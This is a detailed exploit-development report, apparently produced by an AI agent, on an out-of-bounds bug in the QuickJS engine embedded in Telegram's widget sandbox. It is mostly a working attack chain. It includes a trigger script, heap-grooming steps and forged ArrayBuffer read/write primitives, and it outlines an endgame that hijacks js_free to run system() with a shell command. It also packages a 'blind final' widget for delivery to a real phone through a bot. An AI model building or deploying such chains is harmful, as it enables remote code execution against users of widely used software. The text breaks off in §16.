# Parser/compiler hunt: new `ARG_SCOPE_END` scope-index leak: OOB read/write in `add_closure_variables`

Date: 2026-11-07. Worker: `hunt_parser` (subagent). **Host-only: no device
operations** (no adb/frida/phone; the orchestrator owns the device).

Target: the exact shipped widget-engine snapshot **2dfeee3e**
(`round7/src-app`, copied unmodified to `zeroday_hunt_parser/src`), the
quickjs fork embedded in `libtmessages.49.so` (72889). Focus: parser /
compiler paths reachable from an attacker-controlled eval string.

Verdict: **CONFIRMED; new memory-safety bug, not on the known list**
(N1, C1, C2/R7A, named-group trailer, atom-table, V1, V2, F1, T1, T2, T3,
F-A, F2, S1, R1, R2). It is an out-of-bounds read that, with ordinary heap
grooming, becomes an **out-of-bounds write of `JSClosureVar` records past a
live heap allocation**, and then a **forged `ArrayBuffer.byteLength`
(64 → 327,744) with a working huge typed-array view and cross-object OOB
read/write**. It needs **no OOM and no allocation failure**, so the fork's
uncatchable-OOM gate is irrelevant; and the write is 8-byte-strided,
selected by heap grooming, so N1's 20-byte `scopes`/`ArrayBuffer` grid
constraint does not apply. Both of N1's stated blockers are removed.

| evidence | result |
|---|---|
| ASan OOB read (`min_oob.js`) | **5/5** SEGV in `add_closure_variables` at `quickjs.c:35479`, address `0x512000141448` identical in all runs |
| ASan OOB write (`asan_closure_overflow.js`) | **5/5** `heap-buffer-overflow` at `set_closure_from_var` `quickjs.c:35451`, 0 bytes after the 64-byte `closure_var` region allocated at `add_closure_variables:35487` |
| device-model plain build (arena ON, 8/7/6/5 MiB) `len_forge.js` | **5/5** live `JSString.len` 320 → 65,600 |
| device-model plain build `ab_forge.js` | **5/5** `ArrayBuffer.byteLength` 64 → 327,744, `Uint8Array.length` 327,744, cross-object read at view offset 96 + write to a live 39-char string observed (`WROTE=true`) |
| upstream contrast | same bug is present in current quickjs-ng `e22ce4d` (round7/src); see §9 |

---

## 1. Root cause (exact sites, shipped source `round7/src-app/quickjs.c`)

The direct-eval scope index emitted by the parser is `int16`-truncated
through a `u16` operand, and the value `-2` (the argument-scope
end-of-list marker) leaks into a *runtime variable index*:

```
37763  js_create_function():
           if (fd->has_parameter_expressions)
               fd->scopes[ARG_SCOPE_INDEX].first = ARG_SCOPE_END;   /* -2 */

35955  resolve_variables(), case OP_eval:
35962  resolve_variables(), case OP_apply_eval:
           scope = get_u16(bc_buf + pos + ...);        /* scope 1 = arg scope */
           dbuf_put_u16(&bc_out, s->scopes[scope].first + 1);
                                       /* -2 + 1 = -1 -> 0xFFFF */

19405  JS_CallInternal(), CASE(OP_eval):
           scope_idx = get_u16(pc + 2) - 1;             /* 0xFFFF - 1 = 65534 */

35479  add_closure_variables():
           for (i = scope_idx; i >= 0;) {
               vd = &b->vardefs[b->arg_count + i];      /* +1.31 MB OOB */
               if (vd->scope_level > 0) {
35481              JSClosureVar *cv = &s->closure_var[s->closure_var_count++];
                   set_closure_from_var(ctx, cv, vd, i);
               }
               i = vd->scope_next;                      /* attacker-steerable */
           }
```

`add_closure_variables()` is called from `__JS_EvalInternal` (`39007`) for
every **direct** eval, with `b` = the calling function's bytecode:

```
39007      if (b) { if (add_closure_variables(ctx, fd, b, scope_idx)) goto fail; }
```

Why the `-2` marker survives: with `has_parameter_expressions`, the argument
scope is index 1 (`ARG_SCOPE_INDEX`). `add_eval_variables()` normally
overwrites `scopes[1].first` with the hidden `arguments` var, but only when
the function is **not strict**:

```
35359  if (has_arguments_binding) {
           add_arguments_var(ctx, s);
           if (s->has_parameter_expressions && !s->is_strict_mode)
               add_arguments_arg(ctx, s);   /* skipped in strict mode */
       }
```

In strict mode (including strict inherited from an enclosing script or
function), and with **no parameter that declares a variable in scope 1**
(empty destructuring patterns are the way to get parameters without vars),
`scopes[1].first` stays `ARG_SCOPE_END`, and the `u16` operand becomes
`0xFFFF`. The runtime then treats `0xFFFE = 65534` as a variable index.
`JSVarDef` is 20 bytes, so `b->vardefs[arg_count + 65534]` with
`arg_count = 1` is a **fixed +1,310,700-byte displacement** from the calling
function's vardef array.

Note the same exported value also reaches `get_var_ref()` through the
injected closure entries (secondary primitive, §5).

## 2. Trigger (concrete eval string)

Minimal (435 bytes, `poc/min_oob.js`; 301 bytes zlib9):

```js
"use strict";
function f([] = eval("1")) {}
f();
```

* `"use strict"` makes `f` strict (inherited), skipping `add_arguments_arg`.
* `[] = eval("1")` is a parameter with a default ⇒ `has_parameter_expressions`
  is true ⇒ the argument scope (index 1) exists.
* The empty pattern `[]` adds an unnamed argument (so `arg_count >= 1`;
  `vardefs` is non-NULL) but **no variable in scope 1**.
* `eval("1")` is a direct eval ⇒ `OP_eval` with the leaked scope operand.
* The crash happens while compiling the eval, before the destructuring
  TypeError, so the eval source can be anything.

Generic shape: any strict function with at least one default/destructuring
parameter that declares nothing in the argument scope, and a direct eval
inside a parameter initializer.

## 3. ASan proof

Builds (pristine source, no instrumentation):

```
clang -g -O1 -DNDEBUG -D__SANITIZE_ADDRESS__ -fsanitize=address,undefined \
      -fno-omit-frame-pointer -I src harness/run6m.c src/quickjs.c \
      src/libregexp.c src/libunicode.c src/dtoa.c -lm -o build/run_asan
gcc -O2 -g -DNDEBUG -I src harness/run6m.c src/quickjs.c src/libregexp.c \
      src/libunicode.c src/dtoa.c -lm -o build/run_plain
```

### 3.1 OOB read, 5/5

```
ASAN_OPTIONS=detect_leaks=0 ./build/run_asan -l 8 poc/min_oob.js
```

```
ERROR: AddressSanitizer: SEGV on unknown address 0x512000141448
READ of size 8
  #0 add_closure_variables src/quickjs.c:35479
  #1 __JS_EvalInternal    src/quickjs.c:39007
  #2 JS_EvalInternal ... #5 js_call_interp ... #13 main
```

5/5 identical (`logs/asan_oobread_1..5.log`). The address is
`b->vardefs + 20*(1 + 65534)` for the ASan heap layout (the read crosses
ASan's allocator region into an unmapped gap). The plain device-model build
(arena ON) also SIGSEGVs deterministically at 6/7/8 MiB
(`logs/plain_min*.log`).

### 3.2 OOB write, 5/5

When the +1.31 MB target is groomed with attacker `ArrayBuffer` data
(§4.1), `add_closure_variables` reads fake `JSVarDef` records, follows
their `scope_next` chain, and writes `JSClosureVar` entries past the
7-entry (`count = arg_count + var_count + closure_var_count`) array:

```
ASAN_OPTIONS=detect_leaks=0 ./build/run_asan -l 8 poc/asan_closure_overflow.js
```

```
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x506000053a00
READ of size 2 (the bitfield read-modify-write of the store)
  #0 set_closure_from_var  src/quickjs.c:35451
  #1 add_closure_variables src/quickjs.c:35544
  #2 __JS_EvalInternal    src/quickjs.c:39055
0x506000053a00 is located 0 bytes after 64-byte region
allocated by ... add_closure_variables src/quickjs.c:35487
```

5/5 identically (`logs/asan_write_1..5.log`). The record store itself is
the OOB write; ASan reports the bitfield access as a read first.

## 4. Controlled write and forged ArrayBuffer (device-model build, 5/5)

All runs below use the pristine source with the arena/slab allocator on
(the device model), 8 MiB limit unless stated; they also work at 7, 6 and
5 MiB. Generators and artifacts are in `poc/`.

### 4.1 Steered fake `JSVarDef` chain

The OOB read at `vardefs + 20*(argc+65534)` is steered by heap grooming:
1. Make the calling function's bytecode **large** (>512 B, so it is a
   large (`malloc`) block); e.g. add float literals to its body.
2. Allocate ~1000 `ArrayBuffer`s of 1980 bytes filled with a repeating
   20-byte fake `JSVarDef`:
   `{ var_name=0x80000000 (const atom -> no deref), scope_level=1,
      scope_next=-1, flags byte = 0x04 (is_captured=1, var_ref_idx=0) }`.
   glibc chunk stride is 2000 ≡ 0 (mod 20), so all buffers share one
   record grid; a 0..19-byte prefix aligns the grid with the target.
3. The buffers grow the brk past `b + 1.31 MB`, so the target read lands
   in attacker data. The first fake record may use `scope_level <= 0` and
   `scope_next = S` to start the written chain at any chosen index `S`.

Measured host target: buffer #643, offset 1868 (script-dependent; see
`src_diag` ACV OOB print). Every fake record with `scope_level > 0` adds
one closure var; the record's `scope_next` gives the next index.

### 4.2 `JSClosureVar` record layout written past the array

`JSClosureVar` is 8 bytes: `{closure_type:3, is_lexical:1, is_const:1,
var_kind:4}` (byte 0), `uint16 var_idx` (offset 2), `JSAtom var_name`
(offset 4). `set_closure_from_var` copies the fake vd's flags, `var_idx =
i` (the chain index, 16 bits stored) and `var_name = JS_DupAtom(vd->var_name)`.
Consequences:
* `var_name` with bit 31 set (or any `int32 < JS_ATOM_END`) is stored
  verbatim and `JS_DupAtom` does nothing; a fully controlled 32-bit
  value in the record.
* otherwise `JS_DupAtom` indexes `rt->atom_array[v]` unchecked and
  increments a 32-bit refcount at the fetched pointer; a second,
  address-dependent write primitive.

### 4.3 First target: live `JSString.len` (`poc/len_forge.js`)

Function with 41 empty destructuring params + default eval, count = 45;
closure array = 360 B → class-384 block; the victim is the next class-384
block, a live 320-char string. Entry 4 of the overflow lands on the
string's `len`:

```
RESULT LEN[299]=65600          # 5/5, rc=2 (clean)
```

(`logs/len_forge_plain_1..5.log`; 5/5.)

### 4.4 Stronger target: `ArrayBuffer.byte_length` (`poc/ab_forge.js`)

Function with **one** empty destructuring param + 3 body vars ⇒
`count = 1 + 6 = 7`; closure array = 56 B → class-64 block. Class-64
`JSArrayBuffer` structs (`new ArrayBuffer(64)`) are groomed as adjacent
pairs (drain the class-64 free list first, allocate pairs, free the first
of the last pair). The overflow entry at array+64 writes
`byte_length`/`max_byte_length`; entry at array+56 hits the neighbour's
block header (unavoidable, see limits).

```
RESULT ABLEN[599]=327744 VLEN=327744 RD@96 j=1 WROTE=true   # 5/5, rc=2
```

* `ABLEN` = the live `ArrayBuffer`'s byteLength, 64 → **327,744**
  (0x0005_0040: `var_idx=5` from the last normal closure entry, plus the
  flags/pad low byte). `new Uint8Array(ab)` yields a working view of
  length 327,744 over a 64-byte buffer.
* `RD@96`; the view reads a live 39-char string's data (a class-72
  neighbour) at view offset 96.
* `WROTE=true`; writing 39 bytes into the view changes that live
  string's contents, observed from ordinary JS.
* Sizes: `ab_forge.js` **9,515 raw / 793 bytes zlib9**: host CPU
  **~112 ms** (5-run median; `min_oob.js` 0.9 ms). Within the widget's
  32,768 B raw / 4,096 B zlib9 and, with the usual ~3-4× phone factor,
  inside the ~500 ms CPU budget; `--nab`/`--drain` are the CPU knobs.

This is exactly N1's "primitive B" (`AB.byteLength` corruption → oversized
typed-array window) **without N1**: no OOM, no fake scope-parent walk, no
20-byte grid. The N1 endgame that turns that window into RCE
(`notes/audit_n1_weaponization.md` §6-8: overwrite a class-72 RegExp
bytecode with the fake capture program, pivot a class-29/30 JSObject,
walk `shape → proto → ctor → realm = JSContext`, resolve libc via the PIE
GOT, hook `rt->mf.js_free = system`) applies unchanged; it was already
proven 5/5 for the same view primitive.

### 4.5 Second-order primitive: `get_var_ref` OOB var_buf access

The injected closure entries are resolved by `js_closure2` with no bounds
check:

```
18055  vd = &b->vardefs[b->arg_count + var_idx];   /* +20*var_idx OOB */
18056  pvalue = &sf->var_buf[var_idx];              /* +8*var_idx OOB */
```

`var_idx` is the chain index (a 16-bit attacker-chosen value when the
chain is started at `S`). If the fake vd sets `is_captured=1` and a
`var_ref_idx`, `get_var_ref` installs a `JSVarRef` whose `pvalue` points
at `var_buf[var_idx]`; the eval source can then read/write that stack
slot. Without `is_captured`, `js_dup(*pvalue)` reads a JSValue from the
caller's C stack (this is the crash observed when a naive groom is used:
`get_var_ref` at `quickjs.c:18111`). If the injected closure var's
`var_name` equals a predefined atom the eval source can name
(`undefined`, `NaN`, …), the eval can use it as a normal variable -
a controlled, 8-byte-strided stack read/write primitive. Not needed for
the chain in §4.4, but recorded for follow-up.

## 5. Why the shipped fork's mitigations do not apply

* **No allocation failure is involved.** The bug is a compiler/runtime
  type confusion in a scope operand; the OOB read and the writes happen in
  `add_closure_variables` before any allocation can fail. The fork's
  `js_throw_uncatchable` / `rt->uncatchable_pending` gate
  (`quickjs.c:8989`, `8337`) is never armed.
* **No 20-byte grid.** The write target is chosen by allocation order
  (class-64/384 arena neighbours) and is 8-byte aligned; there is no
  `(target - scopes - 4) % 20` constraint.
* **No fake scope-parent chain.** The write does not touch `fd->scopes`;
  it only needs the `ARG_SCOPE_END` marker to reach the runtime.

## 6. Reachability under the widget constraints

* The widget evaluates each `<script>` with `JS_Eval` global (the same
  entry as the harness). `"use strict"` at the top of the script is
  ordinary JS; `eval` is the standard global (the shipped
  `sandbox-bundle.js` does not delete/replace it; 72889 exposes the
  engine's normal eval). No host API is used.
* Heap: the final chain works at a **5 MiB** JS limit (tested), so the
  8,388,608 B widget heap has ample headroom; the 2 MB of fillers +
  ~0.9 MB of drain objects are the bulk.
* Source: 9,515 B raw / 793 B zlib9 for the full AB chain; the minimal
  crash is 435 B.
* CPU: 112 ms on this host for the full chain (median of 5); the 500 ms
  device budget should hold after trimming `--drain`/`--nab`.

## 7. Device tuning note (orchestrator-owned)

The fake-record grid offset (`chain_off`) depends on the *exact* compiled
script layout (b's position shifts with the source length): measured
1,868 for one script shape and 668 for another. The scratch dir contains
the instrumented `src_diag` whose `add_closure_variables` prints
`ACV OOB ... target=... buf=N off=M`; generate the final widget body
verbatim with `--uniform_next -1`, run the diag build once to read the
offset, then set `prefix = off % 20`, `chain_off = off - prefix` and
re-run. This is the same per-device calibration round 8 / r8b performed.
A wrong offset is a crash (DoS), not silent corruption.

## 8. Rejected / secondary candidates

| candidate | site | why rejected |
|---|---|---|
| `JS_RegExpDelete` snapshots `re->bytecode` **before** the `lastIndex` ToLength coercion (the fork moved it; upstream coerces first) | `50798` vs `50805` | Real new UAF (a getter that recompiles frees the bytecode, then `lre_get_alloc_count`/`lre_exec` use it, and a reclaimed buffer can supply a fake regexp program). But the coercion only runs JS if `lastIndex` is an accessor, and an own `lastIndex` data property (non-configurable) shadows it; an accessor requires the F1 failed-define, i.e. an OOM. The fork's pending gate then blocks the continuation. **New but OOM-gated; not the deliverable.** Upstream `e22ce4d` has the coercion first (safe order). |
| using-destructuring declarations never allocate the paired `_using_dispose_` local (pairs are only added in the two simple `using` paths) | `29595`, `29891`; destructuring goes through `js_define_var` | `OP_using_dispose` then reads `var_buf[idx+1]` as the dispose method. `idx+1 <= var_count` (first stack slot), so it is an in-frame read: wrong method / TypeError, not OOB. Semantics-only. |
| shape-zombie eviction double-unlink | `6104-6107` | Round 8b's finding: `js_shape_hash_unlink` re-walks the chain and reads NULL (fixed crash) before the proto double-free can be reached; not a controlled write. |
| arena slab release / `madvise` | `1787-2000`, `2084-2100` | Analysed: an arena is released only at `n_used_blocks == 0` after `list_del` from both lists; per-page (4 K) release frees only slots with no live arenas. No reachable invariant break without an existing double-free. |
| inline property array (`js_realloc_object_prop`) | `6155-6190`, `6463-6495` | The `new_size <= p->shape->prop_size` early return is safe on all three call sites (resize_properties always grows; compact_properties has already installed the new shape; add_property compares the old shape). No failure path leaves a dangling `p->prop`. |
| `var_ref_count` / `var_ref_idx` 16-bit truncation in the frame | `477`, `929`, `34633`, `37877`, `18821` | Real in principle (≥65,536 captured vars ⇒ `sf->var_refs[var_ref_idx]` OOB stack write), but a widget source can produce at most ~10⁴ identifiers (needs >256 KB of source; the 32 KB budget rules it out). |
| `emit_atom` silent operand drop and other parser allocation sites | various | OOM-only (dbuf/js_realloc failure) and no attacker-controlled store; the stream stays self-consistent for `compute_stack_size`. |
| fork fast paths (`js_put_field_add`, `OP_define_field`, typed-array store, `js_exotic_skip_for_key`, `OP_push_atom_value`, `js_json_may_have_toJSON`, map-hash cache, regexp cache) | diff vs `e22ce4d` | Enumerated and checked for missing bounds/dups: each either has the needed check or is a self-consistent semantic fast path. No new memory-safety defect found. |
| `js_regexp_exec`/`JS_RegExpDelete` `capture[]` under-sizing with a *legitimate* bytecode | `50460-50510` | `lre_get_alloc_count = 2*capture_count + register_count`; the register operands are renumbered by `compute_register_count` over the same bytecode, and `REOP_save_*` validate `capture_count`. A valid compile cannot under-size. |

## 9. Upstream status / novelty

The root cause is present unchanged in current quickjs-ng `e22ce4d`
(`round7/src`): the same PoC crashes `round7/build/run_e22_asan`
(`add_closure_variables` at `round7/src/quickjs.c:34774`, 5/5). It
therefore also ships in the Telegram fork snapshot 2dfeee3e. It is not in
the known-bug list of this engagement and a web search found no report;
as far as this audit can establish it is unreported. It is *not* one of
the fork's own perf patches (the fork's arena/slab/F2 changes neither
introduce nor mitigate it); it is an upstream latent bug that this
snapshot ships.

## 10. Reproduction

```bash
cd lab/qjs_fork_audit/zeroday_hunt_parser
# builds (pristine src = round7/src-app)
clang -g -O1 -DNDEBUG -D__SANITIZE_ADDRESS__ -fsanitize=address,undefined \
  -fno-omit-frame-pointer -I src harness/run6m.c src/quickjs.c \
  src/libregexp.c src/libunicode.c src/dtoa.c -lm -o build/run_asan
gcc -O2 -g -DNDEBUG -I src harness/run6m.c src/quickjs.c src/libregexp.c \
  src/libunicode.c src/dtoa.c -lm -o build/run_plain

# 1) minimal OOB read (ASan 5/5 SEGV, plain 5/5 SIGSEGV)
ASAN_OPTIONS=detect_leaks=0 ./build/run_asan -l 8 poc/min_oob.js

# 2) OOB write proof (ASan 5/5 heap-buffer-overflow at set_closure_from_var)
ASAN_OPTIONS=detect_leaks=0 ./build/run_asan -l 8 poc/asan_closure_overflow.js
#   (generator: poc/gen_abi.py --nab 1700 --nabs 0 --drain 0 --nfloat 30
#    --ab_size 872 --prefix 8 --uniform_next -1)

# 3) controlled writes / forged ArrayBuffer (device model, 5/5)
./build/run_plain -l 8 poc/len_forge.js      # LEN[299]=65600
./build/run_plain -l 8 poc/ab_forge.js       # ABLEN[599]=327744 ... WROTE=true
#   generators: poc/gen_chain.py, poc/gen_ab_forge.py
#   (chain_off is script-layout dependent: measure with src_diag, see §7)
```

## 11. Artifacts

```
zeroday_hunt_parser/
  src/                      pristine 2dfeee3e (round7/src-app)
  src_diag/                 + ACV/CF/RV/AEV prints and allocation trackers
                            (used only to measure the groom offset)
  harness/run6m.c           6-8 MiB global-eval harness (device model)
  build/run_asan            clang ASan+UBSan (arena off)
  build/run_plain           gcc -O2 device model (arena on)
  build/run_diag            src_diag, plain
  build/run_diag_asan       src_diag + ASan
  poc/min_oob.js            minimal trigger (435 B)
  poc/asan_closure_overflow.js  ASan OOB-write proof script
  poc/len_forge.js          JSString.len write (5/5)
  poc/ab_forge.js           forged ArrayBuffer.byteLength + cross-object RW (5/5)
  poc/gen_ab_forge.py       AB chain generator (groom sizes, prefix, chain)
  poc/gen_chain.py          len chain generator
  poc/gen_groom.py          generic fake-vardef buffer generator
  logs/asan_oobread_1..5.log
  logs/asan_write_1..5.log
  logs/ab_forge_plain_1..5.log
  logs/len_forge_plain_1..5.log
```

## 12. Lemmalog

Verified facts asserted under `hunt_parser_*` in the Telegram project
snapshot (`LEMMALOG_MCP_PATH=.../Telegram-27f28aacca55073e33c1/memory.snapshot`),
including: the site anchors (`round7/src-app/quickjs.c:37763,35955,35962,
19405,35479,35481,18055,18056,35451`), the ASan 5/5 read/write results,
the device-model 5/5 `len`/`AB` results, the removed N1 blockers, and the
rejected `JS_RegExpDelete` / using-destructuring candidates.

## 13. Host-only statement

No device operations were performed by this worker. All runs are host
builds of the exact shipped source snapshot; device calibration of
`chain_off` / `--drain` / `--nab` is left to the orchestrator, who owns
the phone.

---

## 14. `device_calibrated_intermediate` (n1_hookfree chain, hook-free): diagnostics only

**Status: intermediate, not for final delivery.** The widgets in this section
carry a pre-measured `chain_off` and require the one-time Frida calibration;
the universal blind final is in §15. The entrypoint is still the parser 0day
and no n-day stage is used; the only reason it is not the final is the
calibration constant.

The full hook-free chain built by the `n1_hookfree` worker
(`n1_hookfree/REPORT_parser_vs_n1.md`: stage A `A_ab.js` 9,515/793 +
stage B `endG.min.js`/`endG_dev.min.js` 4,219/1,970 or 4,236/1,985, host 5/5
with ASLR) is integrated under `zeroday_hunt_parser/device/`:

* **Architecture.** The shipped `sandbox-bundle.js` collects every `<script>`
  whose type is absent or in its JS whitelist (`text/javascript`,
  `application/javascript`, `text/ecmascript`, `application/ecmascript`,
  `module`, `text/jscript`) and the engine evaluates each collected block as a
  **separate `JS_Eval(GLOBAL)`** in document order, continuing after an
  exception (`SandboxEngine::pumpScripts`). `type="text/plain"` blocks are
  **not** collected (they are data for a `<script>` loader). The package
  therefore uses plain sibling `<script>` blocks: stage A `A_ab.js` verbatim
  (9,515 B), stage B `endG_dev.min.js` verbatim (4,236 B), stage C marker
  (408 B). This is the exact boundary of the host proof (`run_multi`).
  A `(0,eval)`/text-plain wrapper was tested and rejected for the primary
  package: an indirect eval of a strict script makes its top-level `var`s
  locals, so `add_eval_variables` captures them (`count=25`, `cvc=18`) and the
  7-entry class-64 closure array/overflow target is lost.
* **Widgets** (all 14,287 raw / ≤2,953 zlib9, within 32,768/4,096):
  `parser_trigger_72889.html` (stage A + marker), `parser_calib_72889.html`
  (stage A with a dummy record offset + byte-length-padded B/C, same pre-A
  heap), `parser_final_72889.html`, `parser_debug_72889.html` (stage C `if(0)`
  vs `if(1)`, same source length). Host twins use `endG.min.js`.
* **Host validation.** trigger-only widget via the sibling-script harness:
  **5/5** `S1 ABLEN[599]=327744 VLEN=327744 RD@96 j=1 WROTE=true`; final
  scripts at the engine boundary: **5/5** proof (`uid=...` + `HF` in
  `/tmp/hf_proof`); diagnostic calibration build: `buf=647 off=668`
  (prefix 8, record start 668), matching the `n1_hookfree` host constant.
* **Calibration.** One-time Frida `calloc` hook
  (`device/frida_calib.js`): identifies the vulnerable function's
  `JSFunctionBytecode` by request size 889 + field signature
  (`byte_code_len=133, argc=1, var_count=6, cvc=0, cpool=30`), computes
  `target = b + 608 + 20*(1+65534) = b + 1,311,308`, finds the 1,988-byte
  buffer containing it, and prints
  `{off, prefix, chain_off}` before stage A's trigger runs (so a wrong-offset
  crash does not lose the data). Fallback `rpc.exports.heapscan()` for a
  custom JS allocator. The final widget is hook-free once the record start is
  baked. `chain_off` is a per-build/per-body/allocator constant, not a
  per-launch phase (host: 3/3 identical with ASLR, and the exact sibling body
  reproduces 647/668); a different app build, widget body or ROM family needs
  one re-calibration.
* **Runbook.** `device/RUNBOOK_hookfree_parser.md` (test order
  trigger → calibration → final, DB deploy/open without the N1 hook, proof
  path `/data/user/0/org.telegram.messenger.beta/files/n1`, failure map).
* **Remaining device risk (honest limit).** Stage B's endgame was host-proven
  on a fresh runtime (`run_multi`); the app heap (bundle boot + DOM + script
  texts) shifts the arena/slab layout. Under a harness that adds document/
  console shims, the endgame's slab walk reached `HF ERR NOFREE` (wrong
  first candidate). A layout-stable variant that validates candidates with
  the `JSRuntime.malloc_limit` fingerprint (`rt+0x38`) and a direct
  forged-view class-20 scan was prototyped (`device/endG2.js`) but is not in
  the package because it is not yet host-proven end-to-end. The device test
  order (trigger-only, then calibration, then final/debug) is designed to
  surface this as `HF ERR NOOBJ/NOCTOR/NOFREE` in logcat, never as a silent
  write.

---

## 15. Universal blind final (0day-only): parser 0day entrypoint, no n-day stage

**Label: 0day-only. Entrypoint = the ARG_SCOPE_END parser 0day. n-day stages =
none.** This is the package intended for the blind Sony XQ-BT52 run and later
devices; §14 is kept only as the calibrated diagnostic fallback.

### 15.1 Package

| artifact | raw | zlib9 | notes |
|---|---:|---:|---|
| `device/widget/univ_final_72889.html` | 7,282 | 3,125 | blind device final; `endG3_dev.min.js` |
| `device/widget/univ_debug_72889.html` | 7,282 | 3,126 | same + stage C `S1 ...` |
| `device/widget/univ_final_host.html` | 7,266 | 3,111 | host validation twin (`endG3_host.min.js`) |
| `device/widget/univ_debug_host.html` | 7,266 | 3,111 | host validation twin |
| `/tmp/opencode/tgbot/widget.html` | 7,282 | 3,125 | blind <BOT_USERNAME> send path (exact final bytes) |

No Frida runtime, no calibration and no per-device hardcoded unknown values
are used. Known Telegram build/lib offsets are allowed and remain in the
device endgame (`JS_DEF_FREE=0x174b26c`, `FREE_GOT=0x1971ef0`, `CALIGN=4`);
the command is the 50-byte
`id>/data/data/org.telegram.messenger.beta/files/n1`.
Stage B is the generic shape/proto/ctor/realm/rt + ELF resolver endgame
(`device/endG3.js`); no #1827/#1865 stage or n-day-specific code path exists.

### 15.2 Universal stage A (no `chain_off`)

`device/gen_universal_a.py` builds a self-sweeping stage A:

* `b->vardefs[b->arg_count + 65534]` is always `b->vardefs + 1,310,700`
  (`65535*20`), independent of the build. The stage allocates **1800 ×
  `ArrayBuffer(881)`** (the vulnerable `JSFunctionBytecode` is 881 bytes on
  the host model; 889 usable on the device calibration) to form a controlled
  run longer than 1.31 MB after the bytecode;
* each filler is filled with a periodic 40-byte pair of 20-byte fake
  `JSVarDef` records: JUMP
  `[var_name=4, scope_level=5, scope_next=65535, flags=0x04, func=4]` and
  TERM `[var_name=4, scope_level=5, scope_next=4, flags=0x04, func=4]`;
* 5 phases (0,4,8,12,16) × 2 parities are tried at runtime, stopping at the
  first `T[i].byteLength > 1024`. This aligns a JUMP record with the unknown
  target offset; `next=65535` lands one vardef later (`target+20`), inside
  the same 40-byte pair, so the second fake record never reads past the
  filler. (The first draft used `next=65543` at `target+180`; it was rejected
  because a target near the end of an 881-byte buffer would read outside it.)
* the atom table is pre-grown with 65,600 `Symbol()` and only the last 3,000
  are kept. Slot **65535** must be live because a shifted window can read the
  JUMP `scope_next` word as `var_name`; `JS_DupAtom(65535)` then resolves
  instead of dereferencing an invalid atom. The flags byte 0x04 sets
  `is_captured` with `var_ref_idx=0`, so shifted reads that reach
  `js_closure2`/`get_var_ref` use `sf->var_refs[0]`, never an OOB var ref.
* `T[598]` is freed so the 56-byte closure_var allocation (count=7) reuses
  that block; the next block is `T[599]`'s `JSArrayBuffer` struct. The two
  fake entries push the last local (`var_idx=5`, var_kind flags 0x40) to
  entry 8, i.e. byte 64 = next block; `byte_length` becomes
  `0x00050040 = 327,744`.

### 15.3 Host validation (exact widget scripts)

`run_sib_plain` (app-like sibling-script engine: document/console shims, one
`JS_Eval(GLOBAL)` per whitelisted `<script>`, continues after exceptions),
8 MiB limit:

| test | result |
|---|---|
| `univ_final_host.html` ×5 | **5/5** `RESULT ABLEN[599]=327744 VLEN=327744`, `HF OK`, proof `/tmp/hf_proof` 162 B (`uid=...` + `HF`) |
| `univ_debug_host.html` ×5 | **5/5** `HF OK` + `S1 ABLEN[599]=327744 VLEN=327744 ...` |
| all 10 sweep attempts, hit check disabled (`NCALL=10`), 8 MiB and 5 MiB, 3 runs each | no crash; only the uncaught `RESULT NOCORR` diagnostic; every phase/parity is crash-safe |
| memory floor (`run_plain` binary search) | succeeds at **4.27 MiB**, OOM at 4.26 MiB; works at 4.3/5/6/7/8 MiB |
| full chain at a **5 MiB** runtime limit (test-only endgame variant accepting 0x500000) | **5/5** `RESULT ABLEN[599]=327744 VLEN=327744` + `HF OK` + 162-B proof; the whole stage A+B fits the device's ~5.2 MB budget |
| exact stage A/B under a synthetic **~3.1 MB bundle-boot preload** (3000×~1 KB live strings + 2000 props, evaluated before stage A) at 8 MiB | **5/5** `RESULT ABLEN[599]=327744 VLEN=327744` + `HF OK` + 162-B proof (`device/widget/univ_boot_host.html`) |
| CPU (host, median of 3) | ~286-300 ms; 65,600 `Symbol()` dominates; stage B is small |

The device heap limit is 8,388,608 B and the bundle boot/DOM/script live set
is ~3.19 MB, leaving ~5.2 MB; the 4.27 MiB stage-A peak leaves ~0.9 MB of
margin. On Android the 881-byte `ArrayBuffer` data and the vulnerable
bytecode share a Scudo size class, so the +1.31 MB target should be inside a
controlled filler more reliably than on host glibc (which interleaves small
chunks: a host-only fixture with a slightly different script length read
`delta=892`, 11 bytes past a filler; safe but a miss).

The endgame installs the hook and throws `HF OK`; the command runs at runtime
teardown via the patched `mf.js_free`. Host harness teardown produced the
162-byte proof 5/5 on the final widget. The debug widget's stage-C
allocations can perturb the host teardown free order (an occasional empty
proof); use the final widget for the device proof.

### 15.4 Blind device path and failure map

* Send `/tmp/opencode/tgbot/widget.html` via <BOT_USERNAME> inline (or a normal
  widget message; the DB mid-80345 deploy remains the diagnostics fallback).
  No Frida, no calibration.
* Expected: stage A `RESULT ABLEN[599]=327744 VLEN=327744`; stage B `HF OK`;
  after closing/reopening the widget (runtime teardown), pull
  `/data/user/0/org.telegram.messenger.beta/files/n1` and expect the
  `uid=10346(...)` line. A crash after `HF OK` is expected.
* `RESULT NOCORR` = the +1.31 MB target was not inside a controlled 881-byte
  filler at any of the 10 phase/parity attempts; it is a safe miss (no forge,
  no crash). Fall back to §14 to measure the actual offset/containment for a
  different app build or allocator; do not randomise the stage-A source.
* `HF ERR NOV/NOVS/NOABX` = stage A did not forge or `V/VAB/T` are missing;
  `NOOBJ/NOCTOR/NOREALM/NORT/NOFREE/NOANCHOR` = endgame anchor walk;
  `BADPIE/NOGOT/NOELF/NOSYS` = wrong build/lib offsets.

### 15.5 Reproducibility

**SUPERSEDED (2026-11-07): use the canonical c2560s builder, not this recipe.**
This block regenerated the OLD 881-byte `univ_*` package; the current universal
deliverable is the c2560s family (§18-§34). Regenerate the shipped
`c2560_{final,debug,probe}_c2560s_{72929,host}.html` byte-exactly (pinned
SHA-256s asserted; device final pinned to
`992a51267a385c57635f5aed835aa29a1006ca8c584ca3843b265cd2c71318b4`):

```bash
cd lab/qjs_fork_audit/zeroday_hunt_parser
python3 device/gen_c2560s.py                 # build+verify the 6 canonical widgets
python3 device/gen_c2560s.py --no-write      # dry run
python3 device/gen_c2560s.py --check-c2      # + re-verify the c2 variants
```

Stage B source of truth is `device/endG8s.js` (not endG3/min.js) with DBG /
CALIGN / CMD substitutions and **`terser -c passes=2 -m`** (the default single
pass drifts to 7,212 B; passes=2 gives the shipped 7,182 B; identical output on
terser 5.16/5.24/5.31/5.38), padded to B=7,182. The host debug twin was stale
(B=6,897) and is regenerated by the builder (host harness `END=HF READY` 3/3).

---

## 16. Device-driven Scudo containment (parser 0day +1.31 MB target)

The universal widget now runs on the Sony; stage A returns `NOCORR` with the
